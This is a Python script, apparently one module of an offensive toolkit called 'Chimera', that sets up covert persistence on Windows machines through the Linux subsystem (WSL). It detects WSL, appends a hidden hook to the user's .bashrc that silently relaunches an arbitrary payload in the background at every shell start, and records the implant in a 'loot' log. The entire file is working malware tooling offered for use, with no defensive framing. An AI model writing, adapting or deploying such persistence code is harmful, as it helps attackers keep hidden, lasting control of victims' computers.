import os
import sys
import subprocess

def deploy_wsl_ghost(payload_path):
    """
    Weaponized WSL Persistence: Injects a silent execution hook into 
    the Linux subsystem to maintain a foothold on Windows hosts.
    """
    # Check if we are actually running inside WSL
    is_wsl = False
    if os.path.exists("/proc/version"):
        with open("/proc/version", "r") as f:
            if "microsoft" in f.read().lower():
                is_wsl = True

    if not is_wsl:
        print("[-] Target environment is not WSL. Agent aborted.")
        return

    print("[*] WSL Environment detected. Initializing Ghost...")

    # Identify the user's bashrc
    home_dir = os.path.expanduser("~")
    bashrc_path = os.path.join(home_dir, ".bashrc")

    if not os.path.exists(payload_path):
        print(f"[-] Payload missing at: {payload_path}")
        return

    # The Ghost Hook:
    # 1. Checks if the payload is already running to avoid duplicate processes
    # 2. Launches the payload in the background with nohup to survive terminal close
    ghost_hook = f"""
# Chimera WSL Persistence
if ! pgrep -f "{os.path.basename(payload_path)}" > /dev/null; then
    nohup {payload_path} > /dev/null 2>&1 &
fi
"""

    try:
        with open(bashrc_path, "a") as f:
            f.write(ghost_hook)
        
        print(f"[!!!] SUCCESS: WSL Ghost deployed to {bashrc_path}")
        
        # Log to project loot
        loot_path = "../../../loot/persistence_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: WSL_GHOST | Payload: {payload_path} | User: {os.getlogin()}\n")

    except Exception as e:
        print(f"[-] Ghost Deployment Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: 161_wsl_ghost <full_path_to_payload>")
        sys.exit(1)
    
    deploy_wsl_ghost(sys.argv[1])
